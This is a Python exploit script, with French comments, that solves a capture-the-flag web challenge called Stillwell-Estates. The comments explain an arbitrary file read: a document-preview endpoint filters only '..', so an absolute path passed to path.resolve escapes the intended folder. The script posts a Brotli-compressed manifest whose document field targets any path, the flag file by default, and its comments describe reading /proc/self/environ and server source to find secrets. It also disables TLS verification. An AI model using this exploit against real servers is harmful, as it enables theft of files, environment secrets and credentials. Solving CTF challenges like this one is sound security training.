#!/usr/bin/env python3
# Stillwell-Estates (hiCTF) - Web / LFI par chemin absolu
#
# BUG : /api/agency/import/preview accepte un manifest JSON compresse en Brotli ;
#       chaque propriete peut attacher un "document" (nom de fichier) dont le
#       serveur renvoie un extrait via resolvePartnerDoc() :
#           if (name.includes('..')) -> rejet          <-- seul ".." est filtre
#           abs = path.resolve(PARTNER_DOCS, name)      <-- un chemin ABSOLU
#                                                           ecrase PARTNER_DOCS
#           fs.readFileSync(abs)                         <-- lecture arbitraire
#       Donc "document": "/chemin/absolu" lit n'importe quel fichier (sans "..").
#
# Flag : /tmp/stillwell-private/escrow-ledger.txt  (ligne "Closing authorization").
#        Decouvert via /proc/self/environ (SECRET_DIR) puis /proc/self/cwd/server.js.
#
# Pre-requis : pip install brotli

import brotli, json, ssl, sys, urllib.request

HOST = "https://stillwell-97f62130ea21.chall.hiddeninvestigations.net"

def preview(doc):
    """Envoie un manifest d'une propriete pointant 'doc' et renvoie la reponse JSON."""
    payload = {"format": "stillwell.agency-export/1",
               "properties": [{"title": "T", "neighborhood": "N", "price": 1, "document": doc}]}
    body = brotli.compress(json.dumps(payload).encode())
    req = urllib.request.Request(
        HOST + "/api/agency/import/preview", data=body, method="POST",
        headers={"Content-Type": "application/json", "Content-Encoding": "br"})
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    try:
        r = urllib.request.urlopen(req, context=ctx, timeout=20)
        return r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", "replace")

if __name__ == "__main__":
    # Par defaut : lit directement le ledger restreint (le flag).
    doc = sys.argv[1] if len(sys.argv) > 1 else "/tmp/stillwell-private/escrow-ledger.txt"
    resp = json.loads(preview(doc))
    d = resp["sample"][0].get("document", {})
    if "excerpt" in d:
        print(d["excerpt"])
    else:
        print("[!]", d.get("error", resp))
